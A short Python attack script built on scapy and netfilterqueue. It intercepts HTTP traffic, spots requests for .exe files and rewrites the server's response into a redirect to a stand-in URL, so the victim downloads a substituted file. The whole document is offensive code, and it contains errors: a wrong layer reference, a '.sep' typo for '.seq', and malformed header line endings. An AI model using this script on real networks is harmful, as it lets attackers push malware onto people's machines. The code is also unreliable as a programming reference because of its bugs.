#! /home/kali/.pyenv/versions/hacking/bin/python


# Scapy lets us probe, scan or attack networks.
import scapy.all as scapy
# NetfilterQueue provides access to packets matched by an iptables rule in Linux. 
# Packets so matched can be accepted, dropped, altered, or given a mark.
import netfilterqueue

# List that contain the numbers of the TCP layer
ack_list = []

# Function that change the info of a packet
def set_load(packet, load):
    # Set the load of the intercepting packet
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# Function that allow to intercept files that are going to be downloaded and then replace it
def process_packet(packet):
    # Converting packets in scapy packets
    scapy_packet = scapy.IP(packet.get_payload())
    # Check if the packet has a layer Raw
    if scapy_packet.haslayer(scapy.Raw):
        # Check if the packet has HTTP request
        if scapy_packet[scapy.TCP].dport == 80:
            # Check is there is .exe request in the Raw layer section load
            if '.exe' in scapy_packet[scapy.Raw].load.decode():
                # Print a message that there is an .exe request
                print('[+] exe Request')
                # Append to the list the ack number
                ack_list.append(scapy_packet[scapy.TCP].ack)
               
        # Check if the TCP layer has 80 in the sport section
        elif scapy_packet[scapy_packet.TCP].sport == 80:
            # Check if the sep number is the same as the one in the ack list
            if scapy_packet[scapy_packet.TCP].sep in ack_list:
                # Removing the ack number from the list
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                # Print replacing file
                print('[+] Replacing file...')
                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp\n\n")
                # Convert the scapy packet to a string and then passing to the modified packet
                packet.set_payload(bytes(modified_packet))

    packet.accept()

# Create a queue for the network traffic to be replaced
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


